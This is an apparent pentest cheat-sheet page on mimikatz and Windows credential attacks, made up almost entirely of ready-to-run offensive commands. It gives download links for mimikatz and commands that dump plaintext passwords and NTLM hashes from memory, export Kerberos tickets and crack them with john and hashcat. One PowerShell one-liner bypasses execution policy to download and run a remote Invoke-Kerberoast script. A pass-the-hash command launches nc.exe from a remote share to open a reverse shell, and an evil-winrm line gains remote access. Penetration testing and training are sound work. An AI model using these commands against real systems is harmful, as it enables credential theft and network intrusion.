---
sidebar_position: 5
---

# mimikatz

mimikatz is a powerful post-exploitation tool for extracting plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory on Windows systems.

- [Latest trunk release](https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.7z)
- [2.2.1 trunk (mirror)](https://github.com/caday00/mimikatz2.1.1/raw/master/mimikatz_trunk.zip)
- [2.2.1 trunk (alt)](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip)

## Basic Commands

- **Check domain users:**

  ```cmd
  net user /domain
  ```

- **Check privilege:**

  ```
  privilege::debug
  ```

- **Dump credentials (passwords, NTLM hashes):**

  ```
  sekurlsa::logonpasswords
  ```

- **List Kerberos tickets:**
  ```
  sekurlsa::tickets
  ```

## Kerberoasting (Extracting Kerberos Tickets)

- **Export tickets for offline cracking:**

  ```
  kerberos::list /export
  ```

  > If this doesn't work, use PowerShell alternatives:
  - [How to Kerberoast like a boss (Pentest Partners)](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)

  ```powershell
  powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
  john --format=krb5tgs kerb-Hash0.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```

- **Other tools:**
  - [kerberoast (Python)](https://github.com/nidem/kerberoast)
  - [tgsrepcrack.py](https://raw.githubusercontent.com/nidem/kerberoast/master/tgsrepcrack.py)
  - [kirbi2hashcat.py](https://raw.githubusercontent.com/jarilaos/kirbi2hashcat/master/kirbi2hashcat.py)
  - [kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/master/kirbi2john.py)

  ```bash
  python tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
  ```

## Pass-the-Hash & Command Execution

- **Pass-the-Hash and run a command:**

  ```
  sekurlsa::pth /user:username /domain:domain.com /ntlm:7c... /run:"\\192.168.119.1\a\bin\nc.exe -nv 192.168.119.1 443 -e cmd.exe"
  ```

- **Evil-WinRM for remote shell:**
  ```bash
  rbenv shell 2.7.4 ; gem install evil-winrm
  evil-winrm -u user -p pass -i 10.11.1.1
  ```
